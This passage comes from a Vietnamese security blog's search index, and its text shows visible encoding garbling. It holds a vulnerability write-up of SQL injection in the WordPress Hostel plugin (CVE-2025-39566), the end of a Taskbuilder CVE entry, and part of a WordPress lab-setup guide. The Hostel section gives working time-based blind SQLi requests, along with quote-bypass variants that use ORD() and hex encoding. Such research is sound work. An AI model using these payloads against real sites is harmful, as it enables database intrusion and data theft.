Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) vÃ  v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ \u003cstrong\u003exá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o\u003c/strong\u003e trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n \u003ccode\u003e'...'\u003c/code\u003e. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lá»— há»•ng trong plugin Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) vÃ  v1.1.5.7(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« GET request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file controllers/bookings.php\nBáº£n lá»— há»•ng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Báº£n vÃ¡:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } ğŸ‘‰ Báº£n vÃ¡ sá»­ dá»¥ng whitelist Ä‘á»ƒ giá»›i háº¡n cÃ¡c cá»™t cÃ³ thá»ƒ Ä‘Æ°á»£c sáº¯p xáº¿p, náº¿u khÃ´ng há»£p lá»‡ tráº£ vá» 'tB.id'.\nAnalysis: Lá»— há»•ng xuáº¥t hiá»‡n khi param ob Ä‘Æ°á»£c truyá»n trá»±c tiáº¿p vÃ o má»‡nh Ä‘á» ORDER BY thÃ´ng qua hÃ m sanitize_text_field(), chá»‰ escape mÃ  khÃ´ng filter SQLi.\nHow it work? Äá»ƒ inject Ä‘Æ°á»£c, ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh toÃ n bá»™ cÃ¢u query Ä‘Æ°á»£c Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); CÃ¢u query náº±m trong nhÃ¡nh default cá»§a cáº¥u trÃºc switch.\nToÃ n bá»™ Ä‘oáº¡n xá»­ lÃ½ naá»³ thuá»™c vá» hÃ m static manage() cá»§a class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiáº¿p vá»›i core thÃ´ng qua Plugin API (Hook System). Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m manage() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a \u0026quot;manage\u0026quot; trong thÆ° má»¥c chá»©a plugin.\nTrong file models/hostel.php ta cÃ³ hÃ m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } á» Ä‘Ã¢y:\nadd_menu_page() táº¡o menu chÃ­nh trong Admin Dashboard. add_submenu_page() thÃªm cÃ¡c submenu con cho menu Ä‘Ã³. Tham sá»‘ $callback lÃ  má»™t callback function sáº½ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng click vÃ o menu/submenu. VÃ­ dá»¥:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Táº¥t cáº£ menu/submenu nÃ y Ä‘á»u Ä‘Æ°á»£c Ä‘Äƒng kÃ½ bÃªn trong hÃ m static menu() cá»§a class WPHostel. Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m menu() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a menu trong thÆ° má»¥c chá»©a plugin.\nTrong file hostel.php á»Ÿ thÆ° má»¥c gá»‘c cá»§a plugin ta cÃ³:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. Hook name á»Ÿ Ä‘Ã¢y lÃ  admin_menu, nghÄ©a lÃ  hÃ m WPHostel::menu() sáº½ Ä‘Æ°á»£c gá»i trong vÃ²ng Ä‘á»i khi WordPress dá»±ng Admin Dashboard Menu. Menu trÃªn UI Admin Dashboard\nDebugging\nChá»©c nÄƒng bá»‹ lá»—i náº±m trong Booking Manager, vÃ¬ váº­y ta truy cáº­p vÃ o submenu Manager Bookings trÃªn UI Admin Dashboard. Ngay trÆ°á»›c nhÃ¡nh default cÃ³ comment // list bookings =\u0026gt; cho tháº¥y Ä‘oáº¡n code nÃ y xá»­ lÃ½ viá»‡c liá»‡t kÃª vÃ  sáº¯p xáº¿p bookings Má»Ÿ debugger: Click Run with Debugger. Äáº·t breakpoint táº¡i nhÃ¡nh switch chá»©a code lá»—i vÃ  táº¡i dÃ²ng code gÃ¢y lá»—i. Khi click vÃ o má»™t cá»™t trong báº£ng bookings, quan sÃ¡t: Debugger nháº£y vÃ o cáº¥u trÃºc switch. DÃ¹ng Step Over, debugger Ä‘i tiáº¿p vÃ o nhÃ¡nh default. Tiáº¿p tá»¥c Step Over vÃ  theo dÃµi giÃ¡ trá»‹ biáº¿n trong tab Variables \u0026gt; Locals. CÃ¡c biáº¿n nÃ y sáº½ káº¿t há»£p Ä‘á»ƒ táº¡o thÃ nh cÃ¢u SQL bÃªn dÆ°á»›i. Sau khi ghÃ©p cÃ¡c biáº¿n, cÃ¢u query Ä‘áº§y Ä‘á»§ cÃ³ dáº¡ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ÄÃ¡ng chÃº Ã½, biáº¿n $orderby Ä‘Æ°á»£c gÃ¡n nhÆ° sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } âš ï¸ á» Ä‘Ã¢y cÃ³ Ä‘iá»ƒm báº¥t thÆ°á»ng:\nPháº§n sau ORDER BY sá»­ dá»¥ng sanitize_text_field(). HÃ m nÃ y chá»‰ lÃ m sáº¡ch HTML, khÃ´ng há» filter hoáº·c validate Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n trong SQL context. Tham sá»‘ ob (do ngÆ°á»i dÃ¹ng truyá»n vÃ o) vÃ¬ váº­y cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ chÃ¨n trá»±c tiáº¿p vÃ o cÃ¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tÃ¡ch má»‡nh Ä‘á» ORDER BY báº±ng , vÃ¬ nÃ³ cháº¥p nháº­p multi column\nKáº¿t quáº£: thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nDump Data from Database Bypass ' using ORD():\nÄá»ƒ dump dá»¯ liá»‡u cá»§a database ta cáº§n thá»­ Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a database name.\nDo sanitize_text_field() loáº¡i bá» ', ta khÃ´ng dÃ¹ng Ä‘Æ°á»£c payload so sÃ¡nh trá»±c tiáº¿p. Thay vÃ o Ä‘Ã³ dÃ¹ng ORD() Ä‘á»ƒ so sÃ¡nh kÃ½ tá»± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nBypass ' using Hex encoding (extend)\nNgoÃ i ORD() ta cÃ³ thá»ƒ sá»­ dá»¥ng Hex encoding Ä‘á»ƒ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nConclusion Lá»— há»•ng CVE-2025-39566 trong plugin WordPress Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nKey takeaways:\nsanitize_text_field() â‰  chá»‘ng SQL Injection Cáº§n phÃ¢n biá»‡t rÃµ: lá»c input cho HTML vs cho SQL References SQL Injection Cheat Sheet â€“ PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLá»— há»•ng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) vÃ  v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« \u003cstrong\u003eGET\u003c/strong\u003e request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\nRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦ Hiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress. CÃ³ 2 phiÃªn báº£n WordPress:\nWordPress.com Dá»‹ch vá»¥ hosting do Automattic cung cáº¥p Báº¡n chá»‰ cáº§n Ä‘Äƒng kÃ½ tÃ i khoáº£n, khÃ´ng pháº£i cÃ i Ä‘áº·t Háº¡n cháº¿ tÃ¹y chá»‰nh, muá»‘n nÃ¢ng cao thÃ¬ pháº£i tráº£ phÃ­ WordPress.org MÃ£ nguá»“n má»Ÿ, báº¡n tá»± táº£i vá» vÃ  cÃ i Ä‘áº·t lÃªn hosting/server riÃªng TÃ¹y chá»‰nh toÃ n diá»‡n, cÃ³ thá»ƒ cÃ i plugin, theme, viáº¿t code, táº¡o website theo Ã½ mÃ¬nh Ecosystem Core: CMS chÃ­nh Plugin: Má»™t pháº§n má»m bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn trang web WordPress Ä‘á»ƒ má»Ÿ rá»™ng chá»©c nÄƒng cá»§a nÃ³ vÃ  thÃªm cÃ¡c tÃ­nh nÄƒng má»›i Themes: Má»™t pháº§n má»m bá»• sung Ä‘áº¡i diá»‡n cho sá»± xuáº¥t hiá»‡n trá»±c quan vÃ  bá»‘ cá»¥c cá»§a má»™t trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiá»‡n táº¡i hÆ¡n 40% website trÃªn toÃ n tháº¿ giá»›i cháº¡y WordPress NghÄ©a lÃ  hacker chá»‰ cáº§n tÃ¬m ra má»™t lá»— há»•ng phá»• biáº¿n =\u0026gt; cÃ³ thá»ƒ khai thÃ¡c hÃ ng triá»‡u site cÃ¹ng lÃºc Giá»‘ng nhÆ° â€œcÃ¡ nhiá»u thÃ¬ chÃ i á»Ÿ Ä‘Ã³â€ Plugin and Theme WordPress Core Ä‘Ã£ Ä‘Æ°á»£c xem xÃ©t trong 1 thá»i gian dÃ i bá»Ÿi hÃ ng ngÃ n developers vÃ  researchers. Káº¿t quáº£ lÃ  ráº¥t khÃ³ Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»™t nháº­p vÃ o Tuy nhiÃªn, cÃ³ hÃ ng chá»¥c ngÃ n plugin vÃ  theme tá»« nhiá»u nguá»“n, cháº¥t lÆ°á»£ng khÃ´ng Ä‘á»“ng Ä‘á»u Ä‘Æ°á»£c sá»­ dá»¥ng Nhiá»u plugin code báº£o máº­t kÃ©m, khÃ´ng cÃ²n Ä‘Æ°á»£c cáº­p nháº­t. Hacker chá»‰ cáº§n scan plugin/theme Ä‘á»ƒ tÃ¬m version lá»—i thá»i, rá»“i khai thÃ¡c Setup WordPress for Hacking CÃ³ ráº¥t nhiá»u cÃ¡ch Ä‘á»ƒ setup WorkPress, tÃ¬m kiáº¿m báº±ng Google cÃ³ thá»ƒ cung cáº¥p nhiá»u bÃ i viáº¿t vá» nÃ³. á» Ä‘Ã¢y tÃ´i sáº½ setup trÃªn mÃ¡y áº£o Ubuntu (22.04):\nKhÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c dá»‹ch vá»¥ cá»§a mÃ¡y tháº­t WordPress tÆ°Æ¡ng Ä‘á»‘i nháº¹ Ä‘á»ƒ sá»­ dá»¥ng trÃªn mÃ¡y áº£o Install and configure WordPress Install Dependencies CÃ i toÃ n bá»™ stack cáº§n thiáº¿t Ä‘á»ƒ cháº¡y WordPress (web server + database + PHP + cÃ¡c extension quan trá»ng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Táº£i vÃ  cÃ i mÃ£ nguá»“n WordPress vÃ o thÆ° má»¥c web.\n# Táº¡o folder Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nguá»“n website sudo mkdir -p /srv/www # Äá»•i owner thÃ nh www-data, Ä‘Ã¢y lÃ  user máº·c Ä‘á»‹nh cá»§a Apache/Nginx Ä‘á»ƒ cháº¡y web server # Khi Apache/NGINX khá»Ÿi Ä‘á»™ng, nÃ³ khÃ´ng cháº¡y báº±ng root (nguy hiá»ƒm vÃ¬ cÃ³ toÃ n quyá»n há»‡ thá»‘ng), mÃ  sáº½ drop xuá»‘ng cháº¡y dÆ°á»›i quyá»n www-data. sudo chown www-data: /srv/www # Táº£i gÃ³i WordPress má»›i nháº¥t tá»« trang chÃ­nh thá»©c # Giáº£i nÃ©n vao thÆ°c má»¥c /srv/www Ä‘Æ°á»£c táº¡o á»Ÿ trÃªn curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ³ thá»ƒ táº£i phiÃªn báº£n cá»¥ thá»ƒ báº±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ i tá»« wordpress.org lÃ  cÃ¡ch chuáº©n nháº¥t vÃ  Ã­t rá»§i ro:\nUbuntu cÃ³ sáºµn package wordpress trong repo. NhÆ°ng nÃ³ thÆ°á»ng cÅ© hÆ¡n nhiá»u so vá»›i báº£n chÃ­nh thá»©c trÃªn wordpress.org Cá»™ng Ä‘á»“ng WordPress chá»‰ há»— trá»£ khi báº¡n dÃ¹ng báº£n chÃ­nh thá»©c tá»« wordpress.org, vÃ¬ náº¿u báº¡n gáº·p lá»—i do package cá»§a Ubuntu thÃ¬ há» khÃ´ng giáº£i quyáº¿t Ä‘Æ°á»£c. Configure Apache for WordPress Táº¡o file /etc/apache2/sites-available/wordpress.conf cáº¥u hÃ¬nh Apache cho WordPress:\n# Láº¯ng nghe trÃªn táº¥t cáº£ Ä‘á»‹a chá»‰ IP (*) táº¡i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # ThÆ° má»¥c gá»‘c cá»§a website (nÆ¡i chá»©a mÃ£ nguá»“n WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phÃ©p file .htaccess ghi Ä‘Ã¨ má»™t sá»‘ thiáº¿t láº­p liÃªn quan Ä‘áº¿n báº£o máº­t vÃ  URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cáº­p thÆ° má»¥c, Apache sáº½ tÃ¬m file index.php Ä‘á»ƒ hiá»ƒn thá»‹. DirectoryIndex index.php # Cho phÃ©p táº¥t cáº£ má»i ngÆ°á»i truy cáº­p (cáº§n cho website public). Require all granted \u0026lt;/Directory\u0026gt; # RiÃªng thÆ° má»¥c wp-content (chá»©a plugin, theme, upload) cÅ©ng cho phÃ©p truy cáº­p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; KÃ­ch hoáº¡t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (táº¡o symlink tá»« /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau Ä‘Ã³ site wordpress sáº½ Ä‘Æ°á»£c Apache load khi restart. KÃ­ch hoáº¡t module rewrite:\nsudo a2enmod rewrite WordPress cáº§n module mod_rewrite Ä‘á»ƒ há»— trá»£ Pretty Permalinks (vÃ­ dá»¥ /blog/hello-world/ thay vÃ¬ ?p=123) VÃ´ hiá»‡u hÃ³a site máº·c Ä‘á»‹nh (Option):\nsudo a2dissite 000-default Apache máº·c Ä‘á»‹nh cÃ³ site 000-default.conf (chá»‰ hiá»ƒn thá»‹ \u0026ldquo;It works!\u0026rdquo;) Náº¿u khÃ´ng disable, site máº·c Ä‘á»‹nh cÃ³ thá»ƒ chiáº¿m port 80 trÆ°á»›c WordPress 